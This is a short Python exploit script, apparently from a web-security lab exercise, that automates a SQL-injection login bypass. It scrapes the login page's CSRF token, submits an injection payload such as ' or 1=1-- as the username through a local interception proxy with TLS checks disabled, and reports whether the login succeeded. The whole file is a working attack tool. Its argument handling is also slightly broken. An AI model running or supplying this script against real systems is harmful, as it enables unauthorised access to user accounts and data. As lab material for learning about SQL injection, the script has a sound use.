import requests 
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http' : 'http://127.0.0.1:8080' }

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies )
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input" , {"name": "csrf"})['value']
    return csrf

def exploit_SQLi(s, url, sqli_payload):
   csrf = get_csrf_token(s, url)
   data = {"csrf" : csrf ,
           "username" : sqli_payload ,
           "password" : "anything"}
   r = s.post(url, data=data, verify=False , proxies=proxies)
   res = r.text
   if "Log out" in res:
       return True
   else:
       return False
   
   
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print('Usage : python SQLi.py <url>  <SQLi_Payload>')
        print('Example : python SQLi.py example.com \' or 1=1--')

s = requests.session()

if exploit_SQLi(s, url, sqli_payload):
    print('[+] SQL injection is successful !')
else:
    print('[-] SQL injection is unsuccessful !')